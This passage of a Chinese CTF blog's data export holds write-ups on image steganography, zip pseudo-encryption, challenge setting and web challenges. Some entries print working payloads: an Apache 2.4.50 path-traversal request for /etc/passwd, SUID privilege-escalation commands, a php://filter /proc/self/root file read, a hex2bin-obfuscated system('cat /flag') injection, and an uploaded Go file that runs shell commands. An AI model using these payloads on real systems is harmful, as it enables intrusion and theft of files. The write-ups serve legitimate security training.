ctfshow{3425649ea0e31938808c0de51b70ce6a} (10)一个有意思的题下载获取了一个不支持jpg打开的文件010打开 看完wp都感觉想不到哈哈哈哈哈 搜索F001然后用眼看 (11)BMP(97条消息) 位图(bmp)文件格式分析_aidem_brown的博客-CSDN博客_bmp位图 通过该文章先了解一下BMP文件格式分析（下面是自己整理的一些必要了解的） 看例题 给出一个bmp结尾文件，然后010打开发现文件头占了53个字节，文件尾部在65053的字节处 这里就用到链接中的位图，他是有像素点组成的，每个像素点由3个字节组成(每个字节控制RGB中一种) 所以这里图片的像素应该为 (675053-53)&#x2F;3&#x3D;225000 然后我们可以打开图片属性查看他现在的像素点为多少 可以看到这里是900*150，135000的像素点 这里猜测是他的长或者宽有问题进行修改测试 题中3提示flag在图片上面所以猜测高有问题 225000&#x2F;900&#x3D;250 010修改对应高度(高度对应位置要看链接中bmp文件格式介绍在位图信息头的第三部分)即可出现flag (12)CRC报错修改高宽有一种题型考察的是CRC报错对高宽进行修改 这里查看CRC错误习惯用010打开然后看是否报错 或者可以用TweakPNG进行查看 然后我们使用脚本跑一下对应宽和高修改即可 (13)stegsolve查看帧12345678910111213stegsolve适用于ctf隐写的利器分为File Format:文件格式Data Rxtract:数据提取Steegram Solve:立体试图Frame Browser:帧浏览器Image Combiner:图片拼接 http://www.caesum.com/handbook/Stegsolve.jar gif文件一般为一个动图会存在很多帧我们这时候就可以使用stegsolve查看每一个帧数查看其中隐藏的信息 可以看到在有的帧中藏了内容 (14)APNG大家都听说过png动图也一般是gif，而这里提到的是apng(动态png)，第一帧为标准的png图像，甚于的动画和帧数数据放在png扩展数据块中（一般用于查看png的软件只会显示第一帧中png图像） 比如拿浏览器打开的时候我们就会发现它是一个动态的 这里我们使用 APNG Disassember即可获取到每一帧的图片 Download APNG Disassembler from SourceForge.net (15)PNGDEBUGGERPngDebugger可以读取PNG图片的数据，检测各数据块中CRC(ong图片中一中使用广泛的数据校验方式，不仅能校验传递过来的数据正确性，还能筛选出哪一位出现了错误)是否正确， 如图分析发现CRC都报错了，这里将IDAT块中的CRC-CODE提取出来拼接转字符串得到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"http://just-aleaf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://just-aleaf.github.io/tags/CTF/"}]},{"title":"出题方法","slug":"出题方法","date":"2022-08-06T08:52:09.000Z","updated":"2022-09-14T15:13:44.369Z","comments":true,"path":"2022/08/06/出题方法/","link":"","permalink":"http://just-aleaf.github.io/2022/08/06/%E5%87%BA%E9%A2%98%E6%96%B9%E6%B3%95/","excerpt":"","text":"我认为一道题最好的理解方式就是去将他制作出来以制作者的心思去理解一道题 MISC(1)lsb隐写什么是lsb隐写:lsb隐写就是通过修改RGB颜色分量的最低有效位(lsb)，而人眼注意不到这前后的变化，通过这个变化来对信息进行隐藏 分析工具：StegSolve通过StegSolve打开对应图片，然后对RGB三原色进行最低位选择，就会显示出隐写内容 除此之外还有zsteg和binwalk强推zsteg 制题思路参考大佬的代码自己修改编写的隐写脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# -*- coding:utf-8 -*-import sysfrom PIL import Imagedef get_key(str): with open(str,&quot;rb&quot;) as f: s=f.read() string=&quot;&quot; for i in range(len(s)):#这里将加密文件通过ord转换为十进制然后在转换为二进制，因为二进制前有’0b‘，利用replace替换，通过zfill函数补位为8位 string=string+&quot;&quot;+(bin(s[i]).replace(&#x27;0b&#x27;,&#x27;&#x27;)).zfill(8) return stringdef mod(x,y): return x%ydef encode(str1,str2,str3): im = Image.open(str1) #获取图片的宽和高 width,height= im.size[0],im.size[1] count = 0 #获取需要隐藏的信息 key = get_key(str2) keylen = len(key) for h in range(height): for w in range(width): pixel = im.getpixel((w,h)) a=pixel[0] b=pixel[1] c=pixel[2] if count == keylen: break #隐藏信息（通过每个像素点的RGB余2，去掉每个像素点的最低为，然后将隐藏的信息取出一位，转换为整形，两者相加 a= a - mod(a, 2)+int(key[count]) count += 1 if count == keylen: im.putpixel((w, h), (a, b, c)) break b = b - mod(b, 2) + int(key[count]) count += 1 if count == keylen: im.putpixel((w, h), (a, b, c)) break c = c - mod(c, 2) + int(key[count]) count += 1 if count == keylen: im.putpixel((w, h), (a, b, c)) break if count % 3 == 0: im.putpixel((w, h), (a, b, c)) im.save(str3) print(&quot;sucess&quot;)if __name__==&#x27;__main__&#x27;: if &#x27;-h&#x27; in sys.argv or &#x27;--help&#x27; in sys.argv or len(sys.argv) &lt; 2: print(&#x27;Usage: python test.py &lt;cmd&gt; [arg...] [opts...]&#x27;) print(&#x27; cmds:&#x27;) print(&#x27; encode image + flag -&gt; image(encoded)&#x27;) print(&#x27; decode length + image(encoded) -&gt; flag&#x27;) sys.exit(1) cmd = sys.argv[1] if cmd != &#x27;encode&#x27; and cmd != &#x27;decode&#x27;: print(&#x27;wrong input&#x27;) sys.exit(1) str1 = sys.argv[2]#获取输入的第二个参数（载体图片的路径） str2 = sys.argv[3]#获取输入的第三个参数（隐写的文件） str3 = sys.argv[4]#获取输入的第四个参数（加密图片的保存路径） if cmd != &#x27;encode&#x27; : print(&#x27;Wrong cmd %s&#x27; % cmd) sys.exit(1) elif cmd==&#x27;encode&#x27;: encode(str1,str2,str3) 发现多了一个图片(测试发现这里只能将加密后文件存储为png文件才会有效) 测试隐写成功 参考浅谈LSB隐写解题与出题 - 知乎 (zhihu.com) (2)伪加密misc中还会经常遇到一种题型就是关于伪加密的 什么是伪加密伪加密就是对文件头的加密标志位进行修改，让用户点开的时候就会显示这是一个加密文件 谈及伪加密就需了解一下zip文件 zip文件由三部分组成： 压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志（文件的各区域开头是50 4B，之后两个字节是版本号，在之后两个字节是判断是否加密的标志位） A.压缩源文件数据区： 50 4B 03 04 头文件标记 xx xx 压缩文件pkware版本 00 00 全局方式位标记（判断有无加密的标志位） （这里判断加密于否的是在头文件标记后间隔2个字节） B.压缩源文件目录区 50 4B 01 02 目录中文件文件头标记 XX XX 压缩使用的pkware版本 XX XX 解压文件所需的pkware版本 00 00 全局方式位标记（判断有无加密的标记位，当改为09，00就可以达到伪加密） C.压缩源文件目录结束标志 50 4B 05 06 目录结束标志 对于识别真假加密的话个人感觉总结的规律有时候也有不准确的时候所以就不进行整理，可以自己修改全局方式标记来进行判断 分析工具：010 Editor这里直接通过010 Editor就可以看到文件对应十六进制寻找到对应文件位置即可 制题思路这里采用ZipCenOp.jar工具 准备一个无密码的zip文件 这里不需要理会报错是java版本问题 解密的使用命令 1java -jar ZipCenOp.jar r 1.zip 参考zip格式压缩包伪加密方法-百度经验 (baidu.com) (3)JPHS隐写什么是JPHS对有压缩JPEG文件进行信息的加密隐藏探测图区工具 分析工具: JPHSJPHIDE:进行将信息隐藏到jpg图片中 JPSEEK:从JPHIDE程序加密隐藏的JPEG图片中探测到并提取到信息文件 Download for Free JPHS for Windows 0.5 (scanwith.com) 制题思路准备一个jpeg图片和隐藏信息 然后打开工具放入jpg照片 放入后点击hide输入解密密码 选择隐藏的信息 将其另存为照片即可 解密同理放入照片点击seek然后输入密码即可 参考(47条消息) 【隐写工具】【试一试？】jphide seek（JPHS） 使用方法,检测提示，附下载地址_黑色地带(崛起)的博客-CSDN博客_jphs使用 (4)APNG什么是APNGAPNG又叫动态PNG（Animated PNG），第1帧为标准PNG图像，剩余的动画和帧速等数据放在PNG扩展数据块里，因此只支持原版PNG的软件会正确显示第1帧,可以解决gif毛边的问题 首先我们看png文件组成 再看APNG组成 在png的组成基础上多了三大块 123acTL 动画控制块 咋第一个IDAT块之前用于告诉解析器这是一个APNG文件包含动画帧总数和循环次数fcTL 帧控制块 每一帧都需要有，出现在IDAT或者fdAT之前fdAT 帧块数据库 转载一张大佬照片 借鉴 (84条消息) APNG在QT中的使用（一）_雨田哥的博客-CSDN博客 分析工具:APNG DisassemberDownload APNG Disassembler from SourceForge.net 获取每一帧的内容和设置 制题思路使用工具APNG Assembler APNG Assembler download | SourceForge.net 准备分辨率相同的照片 12Playback Settings loops设定重复播放动画的次数 12Delays Setting 设定每张照片重复播放的时间左侧为照片数，右侧为每张照片播放秒数 拖入之后点击Make Animated PNGG即可制作APNG动态图 WEBextract()变量覆盖12345678910111213141516&lt;?php$flag=&#x27;flag.php&#x27;;extract($_GET); if(isset($os))&#123; $content=trim(file_get_contents($flag));if($os==$content)&#123; echo&#x27;flag&#123;dnmzhello&#125;&#x27;;&#125;else&#123; echo&#x27;不对哦&#x27;;&#125;&#125;?&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://just-aleaf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://just-aleaf.github.io/tags/CTF/"}]},{"title":"2022DASCTF Apr X FATE 防疫挑战赛","slug":"2022DASCTF-Apr-X-FATE-防疫挑战赛","date":"2022-08-05T11:55:58.000Z","updated":"2022-08-09T15:05:01.889Z","comments":true,"path":"2022/08/05/2022DASCTF-Apr-X-FATE-防疫挑战赛/","link":"","permalink":"http://just-aleaf.github.io/2022/08/05/2022DASCTF-Apr-X-FATE-%E9%98%B2%E7%96%AB%E6%8C%91%E6%88%98%E8%B5%9B/","excerpt":"","text":"MISCSimpleFlow下载附件发现是一个流量包 尝试binwalk看看有没有什么隐写内容 发现一个flag.txt和一个加密的压缩包 也没有别的有用信息尝试从流量包中查找有没有关于flag或者密码的其他内容 进入wireshark查找flag.txt相关内容 发现有四条发现是base64加密过的蚁剑流量 一一进行解密（这里要注意蚁剑流量解码后s需要去除传入参数的前两个字符） 解密发现压缩包密码 熟悉的猫下载附件发现是一个zip文件名的文件修改后缀位zip 内含一个kdbx和zip文件(加密) kdbx文件是windows的密码文件需要用到keepass进行打开 发现加密 hashcat暴力破解 先使用keepass2john获取hash值 这里生成的txt中要打开将前面的len5:去掉（把那个不属于hash值） 1hashcat -m 13400 keepass.txt -a 0 password.txt --force//这里的password.txt是使用crunch生成的五位数密码本 1hashcat -m 13400 keepass.txt -a 0 password.txt --force --show //显示结果 获得对应密码jbRw5PB2kFmor6IeYYil 解开kbdx文件发现zip文件的密码解密hint中发现k值同时发现存在零宽隐写 Unicode Steganography with Zero-Width Characters (330k.github.io) 通过k和获取到的两个值猜测这里有塔珀自指公式的加密 (41条消息) 代码急转弯——Tupper（塔珀自指公式）_ygys1234的博客-CSDN博客_塔珀自指公式 然后用大佬脚本将k和两个对应值修改 12345678910111213141516171819202122232425import numpy as npimport matplotlib.pyplot as pltfrom PIL import Imagea=22b=160def Tupper_self_referential_formula(k): aa = np.zeros((a,b)) def f(x, y): y += k a1 = 2**-(-a*x - y%a) a2 = (y // a) // a1 return 1 if a2 % 2 &gt; 0.5 else 0 for y in range(a): for x in range(b): aa[y, x] = f(x, y) return aa[:,::-1]k = 92898203278702907929705938676672021500394791427205757369123489204565300324859717082409892641951206664564991991489354661871425872649524078000948199832659815275909285198829276929014694628110159824930931595166203271443269827449505707655085842563682060910813942504507936625555735585913273575050118552353192682955310220323463465408645422334101446471078933149287336241772448338428740302833855616421538520769267636119285948674549756604384946996184385407505456168240123319785800909933214695711828013483981731933773017336944656397583872267126767778549745087854794302808950100966582558761224454242018467578959766617176016660101690140279961968740323327369347164623746391335756442566959352876706364265509834319910419399748338894746638758652286771979896573695823608678008814861640308571256880794312652055957150464513950305355055495262375870102898500643010471425931450046440860841589302890250456138060738689526283389256801969190204127358098408264204643882520969704221896973544620102494391269663693407573658064279947688509910028257209987991480259150865283245150325813888942058aa = Tupper_self_referential_formula(k)plt.figure(figsize=(15,10))plt.imshow(aa,origin=&#x27;lower&#x27;)plt.savefig(&quot;tupper.png&quot;)img = Image.open(&#x27;flag.png&#x27;) 这里得到下图（直接得到的图片是翻转的需要旋转180度） 得到33，121，144三个值 更具经验猜测这里用了猫脸变换(arnold变换) 使用网上脚本进行恢复 123456789101112131415161718192021from PIL import Image img = Image.open(&#x27;flag.png&#x27;)if img.mode == &quot;P&quot;: img = img.convert(&quot;RGB&quot;)assert img.size[0] == img.size[1]dim = width, height = img.size st = 33a = 121b = 144for _ in range(st): with Image.new(img.mode, dim) as canvas: for nx in range(img.size[0]): for ny in range(img.size[0]): y = (ny - nx * a) % width x = (nx - y * b) % height canvas.putpixel((y, x), img.getpixel((ny, nx)))canvas.show() 冰墩墩下载附件发现很多txt文件随便点开一个是一串二进制，和下一个文档位置 点击发现每个里面都有一串二进制且最长的为16进制，看大佬wp知道这里需要进行补位 同时发现有start.txt 这里思路是从头到尾获取二进制然后整合转hex编码获取隐藏内容 网上寻找脚本 123456789101112131415161718192021222324252627import refrom binascii import *tmp_filename = &#x27;start.txt&#x27;bin_data = &#x27;&#x27;while True: try: file_path = &#x27;./BinDunDun/&#x27; + tmp_filename with open(file_path) as f: content = f.read() next_file = re.findall(r&#x27;\\w&#123;10&#125;\\.txt&#x27;, content) if next_file != []: tmp_filename = next_file[0] bin_data += content[:content.find(&#x27; &#x27;)].zfill(16) else: print(file_path) break except: breakhex_data = &#x27;&#x27;with open(&#x27;BinDunDun.zip&#x27;, &#x27;wb&#x27;) as f1: for i in range(0, len(bin_data), 8): hex_data += &#x27;&#123;:02x&#125;&#x27;.format(int(bin_data[i:i+8], 2)) f1.write(unhexlify(hex_data)) 获得压缩包解压获得一个pyc文件和一个受损文件 pyc是py文件编译后文件尝试pyc反编译查看有无线索 python反编译 - 在线工具 (tool.lu) 发现没什么线索在根据pyc尝试pyc隐写（使用剑龙） 获得一串字符串 1BingD@nD@n_in_BeiJing_Winter_Olympics 然后习惯性使用010打开无后缀名文件发现JFIF猜测这里是一个JPG文件修改后缀和文件头 发现是一个冰墩墩照片尝试隐写（菜鸟只想到了binwalk发现没有） 看大佬这里有一串之前密码所以想到了JPHS5 解密获得一串base64解密得到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"http://just-aleaf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://just-aleaf.github.io/tags/CTF/"}]},{"title":"出题人挑战赛","slug":"出题人挑战赛","date":"2022-08-02T12:28:43.000Z","updated":"2022-08-09T15:16:03.083Z","comments":true,"path":"2022/08/02/出题人挑战赛/","link":"","permalink":"http://just-aleaf.github.io/2022/08/02/%E5%87%BA%E9%A2%98%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/","excerpt":"","text":"MISC(1)不懂PCB的厨师不是好黑客我们这里下载附件解压发现有题目中的PCB文件夹010打开 然后很简单的crtl+f搜索就可以找到flag (2)卡比知识点:卡比文字，维吉尼亚解密 出题人得多喜欢卡比，确实没想到对应游戏里面的语言，哈哈哈哈哈 上网搜索卡比语言（即使知道是什么也是找了好久） 将给定附件对应翻译即可得到 1PTRH&#123;GWDVSWVQBFISZSZ&#125; 然后这里直接提交发现错误，然后无脑尝试base64发现也不对 然后又想到维吉尼亚密码（加密后也全为英文） 维吉尼亚密码在线加密解密 - 千千秀字 (qqxiuzi.cn) 但是这种解密需要密钥 找遍全部也只有kirby尝试一波发现成功 (3)rootme知识点:SUID提权 开启靶机然后使用xshell进行连接 连接之后尝试管理员权限发现并不可行尝试提权 提权之前就要先了解一下SUID提权 SUID提权（LINUX）A.什么是SUID 首先我们要先了解什么是SUID， SUID是LINUX中的一种特殊类型权限（只作用于二进制可执行文件），当用户在运行一个程序的时候，如果这个程序有SUID权限，那么该程序运行进程的属主就不是发起者，而是文件所属的属主（通俗来说就是当我们以普通用户去运行属主为root且设置了SUID权限的进程时我们可以以root权限去运行该进程达到提权） B.设置SUID权限 12chmod u+s 文件名 //设置SUIDchmod u-s 文件名 //去除SUID 可以通过ls -al查看文件的权限 当我们通过chmod设置权限之后我们可以观察到x变为了s，代表设置成功 C. 提权思路 运行root用户所拥有的SUID文件，当其他用户运行该文件的时候就会获取root身份 这里就需要知道可以进行提权的root设置的SUID权限的二进制可执行文件 123456789nmap vimfindbashmorelessnanocpawk D.探测具有SUID权限的二进制可执行文件 运用于不同系统 123find / -perm -u=s -type f 2&gt;/dev/null/find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb&#123;&#125; 这里以第一条为例进行详细解释 123456find / -perm -u=s -type f 2&gt;/dev/null/-u=s:查找root用户拥有的文件-type:设置正在寻找的文件类型f:常规文件2&gt;/dell/null/:默认&gt;/dev/null为1时为标准输出，为2时会将错误输出到垃圾桶中，通俗点就是不会显示错误整句的意思就是从/目录种查找属主为root同时具备SUID权限的二进制文件并回显，如果有错误就将其输出到dev/null（垃圾桶） E.防范措施 减少对二进制可执行文件赋予SUID权限 回归题目 这里我们就需要用到SUID进行提权 首先查找具有SUID权限属主为root的二进制可执行文件 GTFOBins GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全。介绍了当你有某些二进制文件可用是，如何过去root权限 通过题中提示可以看到flag位置 1date -f /root/flag.txt (4)神必流量下载附件发现是一个流量包 binwalk查看是否有什么隐藏文件 发现有一个7z文件进行提取 提取后访问发现需要密码尝试发现并不是伪加密那就乖乖去找密码 只有流量包了尝试找到对应流量分析发现有个123456尝试输入 解密成功给了一个地址 https://drive.google.com/file/d/140MxBVh-OGvQUuk8tmOw4Xm8it9utIzo/view (4)噪音(5)delflagWEB(1)Power Cookie知识点：cookie修改 启动靶机访问抓包发现发送之后Set-cookie中有admin&#x3D;0值 尝试修改cookie为admin&#x3D;1得到flag (2)魔法浏览器知识点:UA修改，js解密 启动靶场发现需要使用魔法浏览器进行访问 f12查看源代码发现给了一串关于ua修改的js 尝试运行 得到uaburp抓包修改获取flag (3)getme知识点:apache2.4.50目录穿透 启动靶场发现 测试发现时apache2.4.50,该版本具有目录穿越的漏洞 1/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd 测试发现确实存在漏洞 访问日志查看是否有flag的相关信息 1/icons/.%%32%65/logs/access_log 找到flag相关信息一个一个进行访问发现前面的都显示400当最后一个的时候回显flag (4)hackme知识点:go语言 开启靶场 第一眼看到也没什么想法随便点点看 process: log: whoami: whereami users: 发现类似于每一个页面里面是一种命令执行 users显示没有找到users.go这个文件，又发现有一个.go文件的上传点，所以猜测这里是上传一个.go的文件然后点击后会对应寻找.go文件进行命令执行 这里上网寻找一个cat&#x2F;flag的go语言脚本（go语言完全没有接触过），然后以flag.go上传 1234567891011121314151617package main import ( &quot;fmt&quot; &quot;os/exec&quot;) func main() &#123; Command(&quot;cat /flag&quot;)&#125; func Command(cmd string) error &#123; c := exec.Command(&quot;bash&quot;, &quot;-c&quot;, cmd) output, err := c.CombinedOutput() fmt.Println(string(output)) return err&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://just-aleaf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://just-aleaf.github.io/tags/CTF/"}]},{"title":"Dest0g3 520迎新赛","slug":"Dest0g3 520迎新赛","date":"2022-07-31T17:06:01.000Z","updated":"2022-08-09T15:20:24.393Z","comments":true,"path":"2022/08/01/Dest0g3 520迎新赛/","link":"","permalink":"http://just-aleaf.github.io/2022/08/01/Dest0g3%20520%E8%BF%8E%E6%96%B0%E8%B5%9B/","excerpt":"","text":"AI(1)OCR下载发现是一个凌乱的图片尝试使用010 Editor（这里为什么使用该编译器，因为改编译器会提示CRC错误) 这里发现CRC报错说明宽或高方面有问题上网找一个脚本进行宽高的修改 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import zlib import struct import binascii file = &#x27;flag_pic (2).png&#x27;//只需要将这里的file名改为对应文件名即可 fr = open(file,&#x27;rb&#x27;).read() data = bytearray(fr[12:29]) crc32key = struct.unpack(&#x27;&gt;I&#x27;,fr[29:33])[0]&amp;0xffffffff print(crc32key) n = 4096 for w in range(n): width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w)) for h in range(n): height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] #print(data) crc32result = zlib.crc32(data) if crc32result == crc32key: print(crc32key) print(width,height) print(data) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+&#x27;.png&#x27;,&#x27;wb&#x27;) fw.write(newpic) fw.close 运行得到正常文件这里获得的是一个图片这里就呼应了题目用到了OCRhttps://uutool.cn/ocr/ 12345678910111213141516171819377 ABCAF271C000451FCF397500200000000000062000000000000001D9C97C8E004D002485D002294A676D2FDE351A055C168F9710364AE2D581126E378F3B4C47E15E2E80B74234B849430A221F40C086E06B24ADAAC47F32CB62CADD154B50723E65E50CDF99CC2B953916AD2204D70C15FB493BD4C2E1F93902FB3563190ACEE58CC01621BB2AAAB6EED8CE892FEF5F0927E2C4BCD7C188277D09D0357995A2FB65D31CD99C853D7BAF52EAD8555920D1672B4A3B713917E98FB324AD225A3FA2AFAC1435FFE31ED0COCEFOCAOB68COCCCA81C458680D7C75139429D282984933F7ACFDFB127321D9F4EFCOFEAAE92F985D3C457E90AFBC4DA9D11B23E507A0953036A2EC1D75D69CD1F6A9F0790B1AB02D6C2AFFDF66A2E7E56A1070FBCD316813E12DF9E26FC4813D419792A65960D4D97EDFA7A978A0385C04CF36EFDE3B07DF9B9405253EAA838149910F2571FAA4A8E085D1567C5C17C9B3400F91FBFE6B47E052BA07097C9D77803D3A45E3477FE324603179C7CA6A128CDC0F7E834812618AD4C79934226637E9300C5595E355139A2ECF661A5F63750A6A0035ACF52417AF3A1C1FEA14471D074C27F81C719D98717F4ECD32918BD15C18AB93769E94DDEFD3B6FAF4DDD6628BA44BDEF574FCCD5589334EA8063D7B27A2F0600FC864D010A7F0CEC9B9395434878D01943887194342F9D34FC8F12DD4556ED5A5A36667F9319A0395DB9A445B94C44771B406F962B1CFC8535BA0D3EE3 DDDEB876C95092AAB192B168A732F3A7B9E8156C403C583983F5527A0D6C5D6928481D56955474046D9FC17A2DE21F3D6FC4C69644E7C6A141BE948A417A33D62C6FF6DFAC702A0FC101748D9A9C64A6A0000010406000109825000070B010001212101000C84D100080A0196EAFE6000000501190A0000000000000000000011190044006500730074003000670033002E00740078007400000019020000140A0100B547E05F6654D8011506010020000000000000 发现对应的十六进制我们将其放入编辑器发现是zip文件解压即可得到一个txt文件发现中间base64加密密文解密即可获得flag (2)The correct flag下载附件发现有好多看不到的数据尝试复制粘贴到记事本发现出现数据然后就是词汇分析表示摆烂没搞懂 MISC(1)Pngenius下载附件是一张照片一张照片还是misc不管三七二十一先zsteg看看有没有隐写内容发现一个zip密码说明内藏了一个zip文件所以就在使用binwalk分离一波反手分离出来写入zip密码解压即可获得flag (2)EasyEncode下载附件是个zip文件解压有密码先来试试伪加密防止搞半天白搞发现不是伪加密 那就用ziperello暴力破解一下得出密码位100861得到一段摩斯密码解密得到十六进制数据将内容放到编辑器查看获得unicode编码数据进行转中文发现又url编码再次解码获得base64编码再次解码获得flag (3)你知道js吗下载附件习惯性查看一下16进制发现xml尝试修改后缀为doc打开获得一串数据发现是base64编码的格式解码获得数据发现url编码特点解码发现了brainfuck的特点再次解码获得十六进制数据放入即可获得flag (4)StrangeTraffic没看懂获取tcp后的步骤之后搞懂再补充 (5)EasyWord下载附件返现doc和rar多进行了加密只有hint没有加密查看发现这提示掩码攻击然后就不懂了 (6)Python_jail下载附件发现有三个文件，一个内容为介绍，一个为空，一个是一个加密的zip 更具介绍和空白想到空白编码上工具https://vii5ard.github.io/whitespace/将空白的编码输入进去进行解密解密获得照片 看到照片首先想到lsb 获得得到base64编码base64解码得到flag (7)codegame下载附件名字叫zip那就尝试修改后缀为zip进行解压发现两个文件查看文档发现是LOLCODE编码尝试运行https://www.dcode.fr/lolcode-language网站运行 输入密码解压然后发现还有一个doc文件进去发现是空白摆烂想到题目里面zip改后缀为zip再试试解压发现fllllll1ag文件打开发现是表情果断解密https://aghorler.github.io/emoji-aes/把解压密码带入key尝试解密发现解密不出来 有解不出来摆烂摆烂摆烂然后看到advanced尝试修改发现4时解密成功解密出来16进制数据进行编译器查看 被污染的二维码下载附件发现时一个zip文件名的文件尝试修改后缀位zip发现得到两个文件都拉进010看看十六进制在这里插入图片描述 发现一个是png文件一个是7z文件尝试将png文件进行binwalk分离获再看flag2的十六进制的数据发现文件头有问题正常zip的文件头为377ABCAF更改另存为zip即可获取)使用刚才的密码即可解压获取到一串数据 发现足有127列猜测是零宽http://330k.github.io/misc_tools/unicode_steganography.html网站开解这里解释后要选择前三个（没有理解为什么要选前三个理解之后再回来写）发下隐藏的是N-ZA-M对应想到rot13那就再去rot13一波http://www.mxcz.net/tools/rot13.aspx一看芜湖base64来了解密解密解密崩了啊怎么还隐藏四位只能跑回flag1的照片里面再试试修改后缀为png然后发现磨碎的二维码然后尝试修复https://merricx.github.io/qrazybox/表示对该工具不熟悉我尝试拖进去一直拖不进去没法下一步修补之后扫描即可获得中间四位得到完整二维码 WEBphpdest方法一进入靶机查看发现有require_once要绕过该函数（只要包含过一次便不会包含）然后读取flag4的内容常见的方法就想到了伪协议和多级符号链接的方法结合绕过这里就要了解&#x2F;proc&#x2F;self和&#x2F;proc&#x2F;self&#x2F;root的含义&#x2F;proc&#x2F;self&#x2F;指当前进程，而&#x2F;proc&#x2F;self&#x2F;root&#x2F;指’’&#x2F;‘’这里如果我们知识使用一些proc&#x2F;self&#x2F;root的话最后也会被转化变为正确的路径导致无法绕过，但凡事都有一个上限当我们超过他所能接受的上限就可以导致其无法识别进而无法转换达到绕过的效果 1?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php 进行base64转换即可获取到flag EasyPHP下载靶机发现没什么思路那就代码分析一下 12345678910111213141516171819&lt;?phphighlight_file(__FILE__); //提高亮度没什么用include &quot;fl4g.php&quot;;$dest0g3 = $_POST[&#x27;ctf&#x27;];//post传入擦书$time = date(&quot;H&quot;);//设置时间参数$timme = date(&quot;d&quot;);$timmme = date(&quot;i&quot;);if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;))&#123;//条件判断时间超过24小时或者超过31天或者超过60s都是无法实现的 echo $fl4g;&#125;else&#123; echo &quot;Try harder!&quot;;&#125;set_error_handler(//该函数用我的理解就是自己设置报错方式 function() use(&amp;$fl4g) &#123; print $fl4g; &#125;);$fl4g .= $dest0g3;?&gt; Try harder! 由于上面if语句根本不可能实现所以我们就要尝试利用函数set_error_hander进行报错输出 1ctf[]=123 SimpleRCE一进去就看到一堆过滤词汇直接奔溃然后看代码发现str_replace函数一般该函数都是用hex2bin()进行绕过同时发现’()‘和单引号没有过滤那就肯定了这一做法hex2bin的用法大家可以自行百度然后绕过机制就为post传入aaa&#x3D;hex2bin(‘73797374656d’)(hex2bin(‘636174202f666c6167’));&#x2F;&#x2F;system(cat &#x2F;flag)","categories":[{"name":"CTF","slug":"CTF","permalink":"http://just-aleaf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://just-aleaf.github.io/tags/CTF/"}]},{"title":"Hello World","slug":"hello-world","date":"2022-07-31T17:02:01.949Z","updated":"2022-07-31T17:02:01.949Z","comments":true,"path":"2022/08/01/hello-world/","link":"","permalink":"http://just-aleaf.github.io/2022/08/01/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"逆向","slug":"逆向","permalink":"http://just-aleaf.github.io/categories/%E9%80%86%E5%90%91/"},{"name":"知识收集","slug":"知识收集","permalink":"http://just-aleaf.github.io/categories/%E7%9F%A5%E8%AF%86%E6%94%B6%E9%9B%86/"},{"name":"PHP审计","slug":"PHP审计","permalink":"http://just-aleaf.github.io/categories/PHP%E5%AE%A1%E8%AE%A1/"},{"name":"CTF","slug":"CTF","permalink":"http://just-aleaf.github.io/categories/CTF/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://just-aleaf.github.io/tags/%E9%80%86%E5%90%91/"},{"name":"知识收集","slug":"知识收集","permalink":"http://just-aleaf.github.io/tags/%E7%9F%A5%E8%AF%86%E6%94%B6%E9%9B%86/"},{"name":"PHP审计","slug":"PHP审计","permalink":"http://just-aleaf.github.io/tags/PHP%E5%AE%A1%E8%AE%A1/"},{"name":"CTF","slug":"CTF","permalink":"http://just-aleaf.github.io/tags/CTF/"}]}